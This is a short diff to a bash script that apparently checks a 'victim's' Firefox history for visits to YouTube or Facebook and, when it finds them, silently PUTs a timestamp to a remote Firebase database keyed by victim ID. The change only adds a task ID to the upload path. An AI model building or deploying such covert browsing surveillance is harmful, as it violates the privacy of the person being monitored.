@@ -4,6 +4,8 @@
 
 SCRIPTDIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 
+thisTaskID="checkBrowserHistory"
+
 victimID="$1"
 
 source "$SCRIPTDIR/deploy"
@@ -58,7 +60,7 @@ if [ ! -z "`firefoxQuery`" ]; then
   echo "Found bad browsing behaviour!"
 
   currentTime=`date '+%s'`
-  curl -s -X PUT -d "$currentTime" "https://${firebaseProject}.firebaseio.com/victims/$victimID/YT_FB_visit.json"
+  curl -s -X PUT -d "$currentTime" "https://${firebaseProject}.firebaseio.com/victims/$victimID/$thisTaskID/YT_FB_visit.json"
 fi
 
 sleep 1.1;
